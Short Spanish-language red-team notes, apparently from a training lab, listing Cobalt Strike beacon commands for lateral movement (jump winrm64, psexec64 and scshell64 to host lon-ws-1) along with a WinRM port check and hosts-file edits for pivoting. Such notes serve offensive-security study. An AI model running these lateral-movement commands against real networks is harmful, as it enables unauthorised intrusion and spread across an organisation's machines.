
## Movimieto Lateral

### WINRM
> Compruebo puerto activo

```powershell
netstat -ano | findstr 5985
```

> Realizo el salto

```powershell
beacon> jump winrm64 lon-ws-1 smb

beacon> jump psexec64 lon-ws-1 smb
```

## Mayor OPSEC

```powershell
Importa el .cna de SCshell

beacon> jump scshell64 lon-ws-1 smb
```

## Pivoting

- Añades las entradas al **/etc/hosts** local tuyo, *ADMIN POWERSHELL*
```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1'
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.10 lon-ws-1'
```

